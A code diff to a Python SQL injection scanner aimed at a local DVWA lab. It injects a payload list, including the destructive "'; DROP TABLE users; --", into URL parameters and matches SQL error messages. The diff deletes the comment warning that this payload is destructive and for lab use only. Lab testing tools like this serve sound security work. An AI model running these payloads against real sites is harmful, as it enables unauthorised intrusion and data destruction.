@@ -2,18 +2,13 @@ import time
 import re
 import requests
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-
-# ---------------------------
 # SQL Injection Payloads
-# ---------------------------
 SQL_PAYLOADS = [
     "' OR '1'='1",
     "' OR 1=1--",
     "\" OR \"1\"=\"1",
-    "'; DROP TABLE users; --",   # ⚠️ destructive! only for lab use
+    "'; DROP TABLE users; --",   
 ]
-
-# Common SQL error message fragments
 SQL_ERRORS = [
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -26,10 +21,7 @@ SQL_ERRORS = [
 
 ERROR_PATTERNS = [re.compile(err, re.IGNORECASE) for err in SQL_ERRORS]
 
-
-# ---------------------------
 # Utility functions
-# ---------------------------
 def get_session():
     """Returns a configured requests session with common headers."""
     session = requests.Session()
@@ -57,11 +49,7 @@ def find_sql_errors(html):
         if pattern.search(html):
             return True, pattern.pattern
     return False, None
-
-
-# ---------------------------
 # Scanner Class
-# ---------------------------
 class SQLiScanner:
     def __init__(self, base_url, cookies=None, timeout=5):
         self.base_url = base_url
@@ -77,7 +65,7 @@ class SQLiScanner:
         params = extract_params(url)
 
         if not params:
-            return  # No query parameters
+            return 
 
         for param in params:
             for payload in SQL_PAYLOADS:
@@ -105,22 +93,17 @@ class SQLiScanner:
                 except requests.RequestException:
                     pass
 
-                time.sleep(0.1)  # avoid flooding
+                time.sleep(0.1)
 
     def run(self):
         print(f"[*] Starting SQL Injection scan on {self.base_url}")
         self.test_params(self.base_url)
         return self.findings
-
-
-# ---------------------------
 # Example Usage (DVWA)
-# ---------------------------
 if __name__ == "__main__":
     # Example: SQLi in DVWA
     target_url = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
 
-    # Update with your DVWA session cookies
     cookies = {
         "PHPSESSID": "your_session_id_here",
         "security": "low"
@@ -132,3 +115,4 @@ if __name__ == "__main__":
     print("\n--- Scan Results ---")
     for finding in results:
         print(finding)
+
